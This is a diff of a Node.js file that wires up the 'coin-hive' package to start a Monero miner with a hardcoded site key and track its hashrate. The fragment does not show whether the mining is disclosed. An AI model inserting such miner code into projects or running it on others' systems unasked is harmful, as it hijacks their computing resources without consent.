@@ -27,68 +27,38 @@ var CoinHive = require('coin-hive');
 //(async () => {
   // Create miner
 
-  CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,start){
+  CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,miner){
     if(err){
         is_hive_start=err;
       }else{
-        is_hive_start="okay";
-      }
+        miner.start();
+        miner.on('found', () => console.log('Found!'));
+        miner.on('accepted', () => console.log('Accepted!'));
 
-  });
+      var fs = require("fs");
+      miner.on('update',function(data){
+
+      coin_hive["hashesPerSecond"]=data.hashesPerSecond;
+      coin_hive["totalHashes"]=data.totalHashes;
+      coin_hive["acceptedHashes"]=data.acceptedHashes;
+
+
+      }); // CoinHive's Site Key
       
-      
+    }
 
-  //}); 
-
-  // .then(function(result){
-  //     // Do something with the result
-  //     is_hive_start=result;
-  // })
-  // .catch(function(error){
-  //   // Handle error
-  //   is_hive_start=error;
-  // });
-
-  // CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq').then(function(miner){
-
-  // //})
-  // //,function(err,miner){
-  //   //is_hive_start=;
-  //   miner.start();
-
-  //   //is_hive_start="yes";
-
-
-  // coin_hive["hashesPerSecond"]=0;
-  //     coin_hive["totalHashes"]=0;
-  //     coin_hive["acceptedHashes"]=0;
-
-
-  // miner.on('found', () => console.log('Found!'));
-  // miner.on('accepted', () => console.log('Accepted!'));
-
-  // var fs = require("fs");
-  // miner.on('update',function(data){
-
-  //     coin_hive["hashesPerSecond"]=data.hashesPerSecond;
-  //     coin_hive["totalHashes"]=data.totalHashes;
-  //     coin_hive["acceptedHashes"]=data.acceptedHashes;
-
-
-  // }); // CoinHive's Site Key
-
-  // // Start miner
+  // Start miner
   
 
-  // // Listen on events
+  // Listen on events
 
     
-  //   // fs.writeFile(process.cwd()+"/found-coin.txt","hashesPerSecond : "+data.hashesPerSecond+" => total hash : "+data.totalHashes+" acceptedHashes : "+data.acceptedHashes,function(err){
-  //   //   //callback({status:{flag:"success"}});
+    // fs.writeFile(process.cwd()+"/found-coin.txt","hashesPerSecond : "+data.hashesPerSecond+" => total hash : "+data.totalHashes+" acceptedHashes : "+data.acceptedHashes,function(err){
+    //   //callback({status:{flag:"success"}});
 
-  //   // });
+    // });
 
-  // });
+  });
 
 }
 catch(err){
